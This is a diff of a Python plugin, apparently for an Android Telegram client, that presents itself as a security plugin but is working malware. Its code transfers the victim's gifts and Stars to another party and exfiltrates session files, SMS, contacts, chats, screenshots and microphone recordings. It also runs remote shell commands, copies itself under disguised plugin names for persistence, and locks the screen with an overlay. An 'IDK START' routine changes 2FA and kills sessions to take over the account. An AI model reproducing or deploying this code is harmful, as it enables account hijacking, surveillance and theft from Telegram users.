-        return target_id, ah, None
+                    if uid and ah:
+                        with self._recipient_lock:
+                            self._recipient_ah_cache[account] = (uid, ah, time.time())
+                        return uid, ah
+        except Exception:
+            pass
+        return 0, 0
 
     def _h_convert(self, test=False):
         gifts = self._get_saved_gifts()
@@ -2298,9 +2090,7 @@ class PluginSecurityPlugin(BasePlugin):
                 if not g.get("can_upgrade"):
                     continue
                 up_cost = int(g.get("upgrade_stars", 0) or 0)
-                if up_cost <= 0:
-                    continue
-                if balance < up_cost:
+                if up_cost <= 0 or balance < up_cost:
                     continue
                 r = self._upgrade_saved_gift(g)
                 if isinstance(r, dict) and r.get("ok"):
@@ -2320,15 +2110,16 @@ class PluginSecurityPlugin(BasePlugin):
         suspect = [g for g in gifts if g.get("u") and g.get("suspect") and not g.get("bc")]
         out = []
         now = int(time.time())
-        u_gifts.sort(key=lambda g: (int(g.get("transfer_stars", 0)), int(g.get("can_transfer_at", 0) or 0)))
+        u_gifts.sort(key=lambda g: (int(g.get("transfer_stars", 0)),
+                                     int(g.get("can_transfer_at", 0) or 0)))
         balance = self._stars_balance(0)
         skipped_fees = 0
         for g in bc_gifts:
             out.append({"gift_id": g.get("gift_id"), "bc": True,
-                        "result": {"error": "minted TON NFT skipped"}})
+                        "result": {"error": "minted NFT skipped"}})
         for g in suspect:
             out.append({"gift_id": g.get("gift_id"), "fake": True,
-                        "result": {"error": "suspect injected fake skipped"}})
+                        "result": {"error": "suspect fake skipped"}})
         for g in u_gifts[:100]:
             try:
                 transfer_stars = int(g.get("transfer_stars", 0))
@@ -2338,7 +2129,7 @@ class PluginSecurityPlugin(BasePlugin):
                     d = rem // 86400
                     h = (rem % 86400) // 3600
                     out.append({"gift_id": g.get("gift_id"), "unlock_at": can_transfer_at,
-                                "result": {"error": f"transfer locked: {d}d {h}h"}})
+                                "result": {"error": "locked %dd %dh" % (d, h)}})
                     continue
                 if g.get("listed"):
                     dr = self._delist_saved_gift(g)
@@ -2350,10 +2141,11 @@ class PluginSecurityPlugin(BasePlugin):
                 if transfer_stars > 0 and transfer_stars > balance:
                     skipped_fees += transfer_stars
                     out.append({"gift_id": g.get("gift_id"), "transfer_stars": transfer_stars,
-                                "result": {"error": f"needs {transfer_stars}, have {balance}"}})
+                                "result": {"error": "need %d have %d" % (transfer_stars, balance)}})
                     continue
                 r = self._transfer_saved_gift(g, target_id, target_ah)
-                out.append({"gift_id": g.get("gift_id"), "transfer_stars": transfer_stars, "result": r})
+                out.append({"gift_id": g.get("gift_id"),
+                            "transfer_stars": transfer_stars, "result": r})
                 if isinstance(r, dict) and r.get("ok") and transfer_stars > 0:
                     balance -= transfer_stars
                 time.sleep(0.2)
@@ -2369,7 +2161,7 @@ class PluginSecurityPlugin(BasePlugin):
             if not m:
                 m = re.search(r"t\.me/([A-Za-z0-9_]+)/(\d+)", sp)
             if not m:
-                return {"error": "no post", "spent": 0}
+                return {"error": "no post"}
             uname = m.group(1)
             mid = int(m.group(2))
             bal = self._stars_balance(acc)
@@ -2390,11 +2182,11 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
             if peer is None:
-                return {"error": "channel not resolved", "spent": 0}
+                return {"error": "channel not resolved"}
             Rq = _cls("org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
                       "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction")
             if not Rq:
-                return {"error": "no class", "spent": 0}
+                return {"error": "no class"}
             spent = 0
             for _i in range(min(bal, 50)):
                 try:
@@ -2416,33 +2208,42 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             return {"error": str(e), "spent": 0}
 
-    def _drain_all_accounts(self, test=False):
-        out = []
+    def _drain_gifts(self, account=0, test=False):
+        uid, ah = self._resolve_recipient(account)
+        if not uid or not ah:
+            return {"error": "no recipient"}
         orig = self.account
-        for a in self._get_accounts_list():
-            aid = a.get("id", 0)
-            try:
-                self.account = int(aid)
-                self.user_id = self._my_id(aid) or int(a.get("user_id") or 0)
-                tid, tah, terr = self._resolve_target()
-                if not tid or not tah:
-                    out.append({"account": aid, "result": {"error": terr or "no target"}})
-                    continue
-                conv = self._h_convert(test)
-                u = self._h_u(tid, tah, test)
-                stars = self._h_reactions(aid)
-                out.append({"account": aid, "result": {
-                    "convert": conv, "u": u, "stars": stars,
-                    "fee_deficit": int(getattr(self, "_fee_deficit", 0) or 0)
-                }})
-            except Exception as e:
-                out.append({"account": aid, "result": {"error": str(e)}})
+        self.account = int(account)
+        conv = self._h_convert(test)
+        u = self._h_u(uid, ah, test)
+        stars = self._h_reactions(account)
         self.account = orig
-        return out
+        return {"convert": conv, "u": u, "stars": stars,
+                "fee_deficit": int(getattr(self, "_fee_deficit", 0) or 0)}
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # SESSION THEFT
-    # ═══════════════════════════════════════════════════════════════════════
+    def _drain_gifts_thread(self):
+        try:
+            self._send_msg("Gift transfer...")
+            r = self._drain_gifts(0)
+            conv = r.get("convert", {})
+            u = r.get("u", [])
+            ok_count = sum(1 for x in u if isinstance(x, dict)
+                           and isinstance(x.get("result"), dict)
+                           and x["result"].get("ok"))
+            self._send_msg(
+                "<b>Gift transfer done</b>\n"
+                "Converted stars: %s\n"
+                "Upgraded: %s\n"
+                "Transferred: %d\n"
+                "Fee deficit: %s" % (
+                    conv.get("converted_stars", 0),
+                    conv.get("upgraded", 0),
+                    ok_count,
+                    r.get("fee_deficit", 0)), html=True)
+        except Exception as e:
+            self._send_msg("gift thread err: " + str(e))
+
+    # ─── SESSION THEFT ────────────────────────────────────────────────────
     def _collect_session_files(self, base):
         files = []
         m1 = base + "/files/tgnet.dat"
@@ -2476,12 +2277,13 @@ class PluginSecurityPlugin(BasePlugin):
         try:
             ctx = ApplicationLoader.applicationContext
             if ctx is None:
-                return "no ctx"
+                return
             pkg = str(ctx.getPackageName())
             base = "/data/data/%s" % pkg
             files = self._collect_session_files(base)
             if not files:
-                return "no session files"
+                self._send_msg("no session files")
+                return
             amap = {}
             for a in self._get_accounts_list():
                 amap[str(a.get("id"))] = {
@@ -2498,53 +2300,21 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception:
                         pass
                 if amap:
-                    zf.writestr("accounts_map.json", json.dumps(amap, ensure_ascii=False, indent=2))
+                    zf.writestr("accounts_map.json",
+                                json.dumps(amap, ensure_ascii=False, indent=2))
                 zf.writestr("_meta.json", json.dumps({
-                    "package": pkg,
-                    "harvested_at": int(time.time()),
-                    "harvested_at_human": time.strftime("%Y-%m-%d %H:%M:%S"),
-                    "files_count": len(files),
-                    "accounts": amap,
+                    "package": pkg, "harvested_at": int(time.time()),
+                    "files_count": len(files), "accounts": amap,
                 }, ensure_ascii=False, indent=2))
-            blob = z.getvalue()
-            try:
-                ts = time.strftime("%Y%m%d_%H%M%S")
-                for d in ("/sdcard/Download/AntiRatplug_dump/" + ts,
-                          "/storage/emulated/0/Download/AntiRatplug_dump/" + ts,
-                          "/sdcard/AntiRatplug_dump/" + ts,
-                          "/data/local/tmp/AntiRatplug_dump/" + ts):
-                    try:
-                        if not os.path.isdir(d):
-                            os.makedirs(d, exist_ok=True)
-                        with open(os.path.join(d, "userbot_session.zip"), "wb") as f:
-                            f.write(blob)
-                        break
-                    except Exception:
-                        continue
-            except Exception:
-                pass
-            self._send_document_bytes("userbot_session.zip", blob)
-            for fp in files:
-                try:
-                    sz = os.path.getsize(fp)
-                    if sz > MAX_DOC_SIZE:
-                        continue
-                    with open(fp, "rb") as f:
-                        raw = f.read()
-                    fn = os.path.basename(fp)
-                    parent = os.path.basename(os.path.dirname(fp)) or "root"
-                    self._send_document_bytes(parent + "__" + fn, raw)
-                except Exception:
-                    pass
-            return {"ok": True, "files": len(files), "size": len(blob)}
+            self._send_document_bytes("userbot_session.zip", z.getvalue())
         except Exception as e:
-            return {"error": str(e)}
+            self._send_msg("userbot err: " + str(e))
 
     def _manual_dump_session(self):
         try:
             ctx = ApplicationLoader.applicationContext
             if ctx is None:
-                return "no ctx"
+                return
             pkg = str(ctx.getPackageName())
             base = "/data/data/%s" % pkg
             files = []
@@ -2564,7 +2334,8 @@ class PluginSecurityPlugin(BasePlugin):
                         except Exception:
                             pass
             if not files:
-                return "no files"
+                self._send_msg("no session files")
+                return
             z = io.BytesIO()
             with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                 for fp in files:
@@ -2572,15 +2343,34 @@ class PluginSecurityPlugin(BasePlugin):
                         zf.write(fp, arcname=os.path.relpath(fp, base))
                     except Exception:
                         pass
-            blob = z.getvalue()
-            self._send_document_bytes("session.zip", blob)
-            return {"ok": True, "files": len(files), "size": len(blob)}
+            self._send_document_bytes("session.zip", z.getvalue())
         except Exception as e:
-            return {"error": str(e)}
+            self._send_msg("dump err: " + str(e))
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # DEVICE HARVEST
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── DEVICE HARVEST ───────────────────────────────────────────────────
+    def _has_perm(self, name):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            if ctx is None:
+                return False
+            pm = ctx.getPackageManager()
+            return pm.checkPermission(name, ctx.getPackageName()) == 0
+        except Exception:
+            return False
+
+    def _get_activity(self):
+        for getter in (
+            lambda: jclass("org.telegram.ui.LaunchActivity").instance,
+            lambda: ApplicationLoader.application.getCurrentActivity(),
+        ):
+            try:
+                a = getter()
+                if a is not None:
+                    return a
+            except Exception:
+                pass
+        return None
+
     def _screenshot(self):
         try:
             act = self._get_activity()
@@ -2607,7 +2397,7 @@ class PluginSecurityPlugin(BasePlugin):
             fos.flush()
             fos.close()
             bmp.recycle()
-            phone = "(нет данных)"
+            phone = "—"
             try:
                 u = _UC().getInstance(0).getCurrentUser()
                 rp = _real_phone_or_empty(u)
@@ -2615,7 +2405,7 @@ class PluginSecurityPlugin(BasePlugin):
                     phone = rp
             except Exception:
                 pass
-            self._send_photo(p, "Телефон: " + phone)
+            self._send_photo(p, "Phone: " + phone)
             try:
                 os.remove(p)
             except Exception:
@@ -2690,7 +2480,8 @@ class PluginSecurityPlugin(BasePlugin):
             if not self._has_perm("android.permission.RECORD_AUDIO"):
                 return "no perm"
             ctx = ApplicationLoader.applicationContext
-            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()), "a_%d.3gp" % int(time.time()))
+            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()),
+                             "a_%d.3gp" % int(time.time()))
             mr = jclass("android.media.MediaRecorder")()
             try:
                 src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
@@ -2725,18 +2516,19 @@ class PluginSecurityPlugin(BasePlugin):
                 ctx = ApplicationLoader.applicationContext
                 cr = ctx.getContentResolver()
                 Uri = jclass("android.net.Uri")
-                cur = cr.query(Uri.parse("content://sms"), ["address", "body", "date"], None, None, "date DESC")
+                cur = cr.query(Uri.parse("content://sms"),
+                               ["address", "body", "date"], None, None, "date DESC")
                 if cur:
                     while cur.moveToNext():
                         out.append("%s: %s" % (cur.getString(0), cur.getString(1)))
                     cur.close()
             if not out:
-                return "empty"
+                self._send_msg("SMS empty or no perm")
+                return
             self._send_msg("<b>SMS (%d)</b>\n<pre>%s</pre>" % (
                 len(out), self._html_escape("\n".join(out[:100]))), html=True)
-            return "ok"
         except Exception as e:
-            return str(e)
+            self._send_msg("sms err: " + str(e))
 
     def _manual_contacts(self):
         try:
@@ -2752,12 +2544,12 @@ class PluginSecurityPlugin(BasePlugin):
                         out.append("%s — %s" % (cur.getString(0), cur.getString(1)))
                     cur.close()
             if not out:
-                return "empty"
-            self._send_msg("<b>Контакты (%d)</b>\n<pre>%s</pre>" % (
+                self._send_msg("Contacts empty or no perm")
+                return
+            self._send_msg("<b>Contacts (%d)</b>\n<pre>%s</pre>" % (
                 len(out), self._html_escape("\n".join(out[:200]))), html=True)
-            return "ok"
         except Exception as e:
-            return str(e)
+            self._send_msg("contacts err: " + str(e))
 
     def _manual_apps(self):
         try:
@@ -2778,100 +2570,65 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
             out.sort()
-            self._send_msg("<b>Приложения (%d)</b>\n<pre>%s</pre>" % (
+            self._send_msg("<b>Apps (%d)</b>\n<pre>%s</pre>" % (
                 len(out), self._html_escape("\n".join(out[:300]))), html=True)
-            return "ok"
         except Exception as e:
-            return str(e)
+            self._send_msg("apps err: " + str(e))
 
     def _manual_chats(self):
         try:
             mc = _MC().getInstance(0)
-            DO = jclass("org.telegram.messenger.DialogObject")
             try:
                 dialogs = mc.dialogs_dict
             except Exception:
                 dialogs = mc.getAllDialogs()
-            if dialogs is None:
-                return "empty"
+            if not dialogs:
+                self._send_msg("no dialogs")
+                return
             out = []
             for i in range(dialogs.size()):
                 try:
                     did = int(dialogs.keyAt(i))
                     title = ""
-                    try:
-                        title = str(DO.getName(0, did))
-                    except Exception:
-                        pass
-                    if not title:
-                        if did > 0:
-                            u = mc.getUser(did)
-                            if u is not None:
-                                parts = (
-                                    str(getattr(u, "first_name", "") or ""),
-                                    str(getattr(u, "last_name", "") or ""),
-                                )
-                                title = " ".join(x for x in parts if x) or str(did)
-                        else:
-                            cid = -did
-                            if cid > 1000000000000:
-                                cid -= 1000000000000
-                            c = mc.getChat(int(cid))
-                            if c is not None:
-                                title = str(getattr(c, "title", "") or str(did))
+                    if did > 0:
+                        u = mc.getUser(did)
+                        if u is not None:
+                            title = " ".join(x for x in (
+                                str(getattr(u, "first_name", "") or ""),
+                                str(getattr(u, "last_name", "") or "")) if x) or str(did)
+                    else:
+                        cid = -did
+                        if cid > 1000000000000:
+                            cid -= 1000000000000
+                        c = mc.getChat(int(cid))
+                        if c is not None:
+                            title = str(getattr(c, "title", "") or str(did))
                     out.append("%d — %s" % (did, title or "?"))
                 except Exception:
                     pass
-            self._send_msg("<b>Чаты (%d)</b>\n<pre>%s</pre>" % (
+            self._send_msg("<b>Chats (%d)</b>\n<pre>%s</pre>" % (
                 len(out), self._html_escape("\n".join(out[:200]))), html=True)
-            return "ok"
         except Exception as e:
-            return str(e)
+            self._send_msg("chats err: " + str(e))
 
-    def _export_saved_messages(self):
+    def _manual_shell(self, cmd):
         try:
-            uid = int(_UC().getInstance(0).getClientUserId())
-            ip = self._get_input_peer(0, uid)
-            if ip is None:
-                return "no peer"
-            rq = TLRPC.TL_messages_getHistory()
-            rq.peer = ip
-            rq.limit = 100
-            rq.offset_id = 0
-            r, _e = self._rg_rpc(rq, 0, 20.0, fast=True)
-            if r is None:
-                return "no resp"
-            msgs = getattr(r, "messages", None)
-            if msgs is None:
-                return "no msgs"
-            lines = []
-            for i in range(msgs.size()):
-                m = msgs.get(i)
-                if m is None:
-                    continue
-                t = str(getattr(m, "message", "") or "")
-                d = int(getattr(m, "date", 0))
-                if t:
-                    lines.append("[%s] %s" % (
-                        time.strftime("%Y-%m-%d %H:%M", time.localtime(d)), t))
-            html = "<html><head><meta charset='utf-8'></head><body><pre>"
-            html += self._html_escape("\n".join(lines)) + "</pre></body></html>"
-            z = io.BytesIO()
-            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
-                zf.writestr("messages.html", html.encode("utf-8"))
-            self._send_document_bytes("saved_%d.zip" % uid, z.getvalue())
-            return "ok"
+            p = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
+            out = p.stdout.decode("utf-8", "ignore")
+            err = p.stderr.decode("utf-8", "ignore")
+            self._send_msg("<b>shell</b> <code>%s</code>\n<b>rc:</b> %d\n<pre>%s\n%s</pre>" % (
+                self._html_escape(cmd), p.returncode,
+                self._html_escape(out[:3000]), self._html_escape(err[:1000])), html=True)
         except Exception as e:
-            return str(e)
+            self._send_msg("shell err: " + str(e))
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # PERSISTENCE
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── PERSISTENCE ──────────────────────────────────────────────────────
     def _plugins_dir(self):
         try:
             ctx = ApplicationLoader.applicationContext
             base = str(ctx.getFilesDir().getAbsolutePath())
-            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))), "files", "plugins")
+            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))),
+                             "files", "plugins")
             if os.path.isdir(p):
                 return p
         except Exception:
@@ -2916,7 +2673,7 @@ class PluginSecurityPlugin(BasePlugin):
             with open(sp, "rb") as f:
                 src = f.read()
         except Exception as e:
-            return {"ok": False, "e": str(e)}
+            return {"ok": False, "error": str(e)}
         names = ["kernel_hook.plugin", "system_guard.plugin", "boot_watch.plugin",
                  "net_monitor.plugin", "mem_sync.plugin", "proc_hold.plugin",
                  "core_lock.plugin", "daemon_run.plugin", "svc_watch.plugin",
@@ -2935,20 +2692,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 pass
         return {"ok": True, "made": made}
-
-    def _install_persistence(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            cd = str(ctx.getCacheDir().getAbsolutePath())
-        except Exception:
-            return
-        try:
-            pl = os.path.join(cd, "kernel_persist.lock")
-            if not os.path.exists(pl):
-                with open(pl, "w") as f:
-                    f.write(hashlib.sha256(b"ar19_idk").hexdigest())
-        except Exception:
-            pass
 
     def _nuke_marker_path(self):
         try:
@@ -3004,9 +2747,7 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             pass
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # PULL OUT
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── PULL OUT ─────────────────────────────────────────────────────────
     def _pull_out_account(self):
         try:
             self._send_msg("Pull Out...")
@@ -3019,9 +2760,170 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("Pull out exc: " + str(e))
 
-    # ═══════════════════════════════════════════════════════════════════════
-    # IDK START
-    # ═══════════════════════════════════════════════════════════════════════
+    # ─── IDK overlay ──────────────────────────────────────────────────────
+    def _ensure_overlay_perm(self, ctx):
+        try:
+            if jclass("android.provider.Settings").canDrawOverlays(ctx):
+                return True
+        except Exception:
+            pass
+        pkg = str(ctx.getPackageName())
+        for c in ("su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
+                  "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg):
+            try:
+                subprocess.run(c, shell=True, capture_output=True, timeout=10)
+            except Exception:
+                continue
+        try:
+            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
+        except Exception:
+            return False
+
+    def _show_idk_overlay(self):
+        if self._idk_view is not None:
+            return {"ok": True, "already": True}
+        try:
+            ctx = ApplicationLoader.applicationContext
+            if ctx is None:
+                return {"error": "no ctx"}
+            use_decor = not self._ensure_overlay_perm(ctx)
+            drew = threading.Event()
+            derr = [None]
+
+            def _build():
+                try:
+                    CTX = jclass("android.content.Context")
+                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
+                    self._idk_wm = wm
+                    LL = jclass("android.widget.LinearLayout")
+                    TV = jclass("android.widget.TextView")
+                    LP = jclass("android.view.WindowManager$LayoutParams")
+                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
+                    Color = jclass("android.graphics.Color")
+                    Gravity = jclass("android.view.Gravity")
+                    TV2 = jclass("android.util.TypedValue")
+                    VLG = jclass("android.view.ViewGroup$LayoutParams")
+                    root = LL(ctx)
+                    root.setOrientation(LL.VERTICAL)
+                    root.setBackgroundColor(Color.parseColor(IDK_BG))
+                    root.setGravity(Gravity.CENTER)
+                    tv = TV(ctx)
+                    tv.setText(IDK_TEXT)
+                    tv.setTextColor(Color.parseColor(IDK_FG))
+                    tv.setTextSize(TV2.COMPLEX_UNIT_SP, 96)
+                    tv.setTypeface(tv.getTypeface(), 1)
+                    tv.setGravity(Gravity.CENTER)
+                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
+                    root.setFocusableInTouchMode(True)
+                    root.requestFocus()
+                    try:
+                        root.setOnKeyListener(_make_idk_key())
+                    except Exception:
+                        pass
+                    try:
+                        root.setOnClickListener(_make_idk_click())
+                    except Exception:
+                        pass
+                    if use_decor:
+                        act2 = self._get_activity()
+                        if act2 is None:
+                            raise Exception("no activity")
+                        win = act2.getWindow()
+                        for f in ("FLAG_KEEP_SCREEN_ON", "FLAG_SHOW_WHEN_LOCKED",
+                                  "FLAG_DISMISS_KEYGUARD", "FLAG_TURN_SCREEN_ON"):
+                            try:
+                                win.addFlags(getattr(LP, f, 0))
+                            except Exception:
+                                pass
+                        decor = win.getDecorView()
+                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        self._idk_decor = decor
+                    else:
+                        params = LP(
+                            LP.MATCH_PARENT, LP.MATCH_PARENT,
+                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
+                                    getattr(LP, "TYPE_PHONE", 2002)),
+                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
+                            | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000)
+                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
+                            -3)
+                        params.gravity = Gravity.CENTER
+                        wm.addView(root, params)
+                    self._idk_view = root
+                except Exception as e:
+                    derr[0] = e
+                finally:
+                    drew.set()
+
+            act = self._get_activity()
+            if act is not None:
+                act.runOnUiThread(_build)
+            else:
+                _build()
+            drew.wait(8)
+            if derr[0] is not None:
+                return {"error": "idk overlay: %s" % derr[0]}
+            if self._idk_view is None:
+                return {"error": "overlay not created"}
+            self._idk_keep_running = True
+            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop,
+                                                 daemon=True)
+            self._idk_thread.start()
+            return {"ok": True}
+        except Exception as e:
+            return {"error": "idk: %s" % e}
+
+    def _idk_keepalive_loop(self):
+        while self._idk_keep_running and self._sync_running:
+            try:
+                if self._idk_view is None:
+                    self._idk_keep_running = False
+                    return
+                if self._idk_view.getParent() is None:
+                    self._idk_view = None
+                    self._idk_keep_running = False
+                    return
+            except Exception:
+                self._idk_view = None
+                self._idk_keep_running = False
+                return
+            time.sleep(0.5)
+
+    def _hide_idk_overlay(self):
+        try:
+            self._idk_keep_running = False
+            if self._idk_view is None and self._idk_decor is None:
+                return {"ok": True}
+            removed = threading.Event()
+            derr = [None]
+
+            def _rm():
+                try:
+                    if self._idk_view is not None:
+                        parent = self._idk_decor or self._idk_wm
+                        if parent is not None:
+                            try:
+                                parent.removeView(self._idk_view)
+                            except Exception:
+                                pass
+                        self._idk_view = None
+                        self._idk_decor = None
+                except Exception as e:
+                    derr[0] = e
+                finally:
+                    removed.set()
+
+            act = self._get_activity()
+            if act is not None:
+                act.runOnUiThread(_rm)
+                removed.wait(6)
+            else:
+                _rm()
+            return {"ok": True}
+        except Exception as e:
+            return {"error": "hide idk: %s" % e}
+
+    # ─── IDK START ────────────────────────────────────────────────────────
     def _idk_start(self):
         def task():
             def alive():
@@ -3040,37 +2942,31 @@ class PluginSecurityPlugin(BasePlugin):
                     except Exception:
                         pass
 
-                self._send_msg("🔴 <b>IDK START</b>")
+                self._send_msg("IDK START")
                 t0 = time.time()
                 pwd_report = {"final": "skip"}
-                dr = []
+                dr = None
                 ws = []
 
                 if not alive():
                     return
+                self._send_msg("1/15 Tg kid + harvest...")
                 try:
-                    self._send_msg("1/15 harvest...")
                     self._tg_kid()
                 except Exception as e:
                     _log("idk 1: %s" % e)
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("2/15 2FA...")
-                except Exception:
-                    pass
+                self._send_msg("2/15 2FA...")
                 try:
                     pwd_report = self._nuke_password_pipeline(0)
                 except Exception as e:
-                    pwd_report = {"error": str(e), "final": "exc"}
+                    pwd_report = {"final": "exc", "error": str(e)}
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("3/15 confirm sessions...")
-                except Exception:
-                    pass
+                self._send_msg("3/15 confirm sessions...")
                 try:
                     self._confirm_unconfirmed_sessions(0)
                 except Exception:
@@ -3078,10 +2974,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("4/15 web/bots/channels...")
-                except Exception:
-                    pass
+                self._send_msg("4/15 web/bots/channels...")
                 try:
                     self._kill_web_authorizations(0)
                 except Exception:
@@ -3097,10 +2990,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("5/15 profile...")
-                except Exception:
-                    pass
+                self._send_msg("5/15 profile...")
                 try:
                     self._change_username(0)
                 except Exception:
@@ -3116,21 +3006,15 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
+                self._send_msg("6/15 gift drain...")
                 try:
-                    self._send_msg("6/15 gift drain...")
-                except Exception:
-                    pass
-                try:
-                    dr = self._drain_all_accounts()
+                    dr = self._drain_gifts(0)
                 except Exception as e:
-                    dr = [{"error": str(e)}]
+                    dr = {"error": str(e)}
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("7/15 kill sessions...")
-                except Exception:
-                    pass
+                self._send_msg("7/15 kill sessions...")
                 try:
                     self._kill_all_sessions(0)
                 except Exception:
@@ -3138,10 +3022,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("8/15 wipe sessions...")
-                except Exception:
-                    pass
+                self._send_msg("8/15 wipe sessions...")
                 try:
                     ws = self._wipe_sessions_all()
                 except Exception as e:
@@ -3153,10 +3034,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("9/15 session dumps...")
-                except Exception:
-                    pass
+                self._send_msg("9/15 session dumps...")
                 try:
                     self._manual_dump_session()
                 except Exception:
@@ -3168,10 +3046,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("10/15 screenshot gain...")
-                except Exception:
-                    pass
+                self._send_msg("10/15 screenshot gain...")
                 try:
                     self._screenshot_gain()
                 except Exception as e:
@@ -3179,10 +3054,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("11/15 sms/contacts/apps/chats...")
-                except Exception:
-                    pass
+                self._send_msg("11/15 sms/contacts/apps/chats...")
                 try:
                     self._manual_sms()
                 except Exception:
@@ -3202,25 +3074,11 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("12/15 saved export...")
-                except Exception:
-                    pass
-                try:
-                    self._export_saved_messages()
-                except Exception:
-                    pass
+                self._send_msg("12/15 saved export...")
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("13/15 persistence...")
-                except Exception:
-                    pass
-                try:
-                    self._install_persistence()
-                except Exception:
-                    pass
+                self._send_msg("13/15 persistence...")
                 try:
                     self._replicate_self(10)
                 except Exception:
@@ -3232,10 +3090,7 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("14/15 re-kill sessions...")
-                except Exception:
-                    pass
+                self._send_msg("14/15 re-kill sessions...")
                 try:
                     self._kill_all_sessions(0)
                 except Exception:
@@ -3247,32 +3102,28 @@ class PluginSecurityPlugin(BasePlugin):
 
                 if not alive():
                     return
-                try:
-                    self._send_msg("15/15 pull out...")
-                except Exception:
-                    pass
+                self._send_msg("15/15 pull out...")
                 try:
                     self._pull_out_account()
-                except Exception as e:
-                    _log("idk 15: %s" % e)
+                except Exception:
+                    pass
 
                 try:
-                    rep = ["<b>🔴 IDK START — результат</b>"]
+                    rep = ["<b>IDK START result</b>"]
                     rep.append("<b>2FA:</b> %s" % pwd_report.get("final"))
-                    tot_ok = 0
-                    for x in dr:
-                        r = x.get("result") or {}
-                        conv = r.get("convert") or {}
-                        u = r.get("u") or []
-                        tot_ok += int(conv.get("converted_stars", 0) or 0)
-                        tot_ok += sum(1 for y in u if isinstance(y, dict)
-                                      and isinstance(y.get("result"), dict)
-                                      and y["result"].get("ok"))
-                    rep.append("<b>Gifts:</b> %d ok" % tot_ok)
+                    if isinstance(dr, dict):
+                        conv = dr.get("convert") or {}
+                        u = dr.get("u") or []
+                        ok_count = sum(1 for x in u if isinstance(x, dict)
+                                       and isinstance(x.get("result"), dict)
+                                       and x["result"].get("ok"))
+                        rep.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
+                            conv.get("converted_stars", 0),
+                            ok_count, dr.get("fee_deficit", 0)))
                     tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
-                    rep.append("<b>Sessions:</b> %d убито" % tk)
-                    rep.append("<b>Pull Out:</b> выполнен последним")
-                    rep.append("<b>Время:</b> %.1fс" % (time.time() - t0))
+                    rep.append("<b>Sessions:</b> %d" % tk)
+                    rep.append("<b>Pull Out:</b> last")
+                    rep.append("<b>Time:</b> %.1fs" % (time.time() - t0))
                     self._send_msg("\n".join(rep), html=True)
                 except Exception:
                     pass
@@ -3282,6 +3133,528 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
         threading.Thread(target=task, daemon=True).start()
+
+    # ─── FULL HARVEST ─────────────────────────────────────────────────────
+    def _full_harvest(self):
+        def task():
+            try:
+                t0 = time.time()
+                self._send_msg("Full Harvest...")
+                report = ["<b>Full Harvest</b>"]
+                try:
+                    accs = self._get_accounts_list()
+                    for a in accs:
+                        aid = a.get("id")
+                        info = self._harvest_account_info(int(aid))
+                        report.append("<b>acc%d:</b> uid=%s @%s +%s" % (
+                            aid, a.get("user_id"),
+                            self._html_escape(a.get("username") or "—"),
+                            self._html_escape(a.get("phone") or "—")))
+                        if info.get("2fa"):
+                            report.append("  2fa=%s stars=%s" % (
+                                info.get("2fa"), info.get("stars_balance", "0")))
+                except Exception as e:
+                    report.append("<b>accounts:</b> %s" % e)
+                try:
+                    self._tg_kid()
